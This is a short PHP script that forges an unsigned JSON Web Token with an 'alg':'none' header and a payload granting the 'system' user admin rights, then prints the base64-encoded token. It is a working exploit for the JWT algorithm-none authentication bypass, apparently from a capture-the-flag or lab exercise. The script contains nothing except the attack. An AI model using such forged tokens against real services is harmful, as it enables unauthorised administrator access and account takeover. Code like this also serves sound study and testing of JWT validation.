<?PHP

$type = '{"alg":"none","typ":"JWT"}';
$login = '{"userId":1,"username":"system","admin":true,"iat":1658411583}';
$sig = '';

echo "\n" . base64_encode($type) . "." . base64_encode($login);
echo "\n";
?>
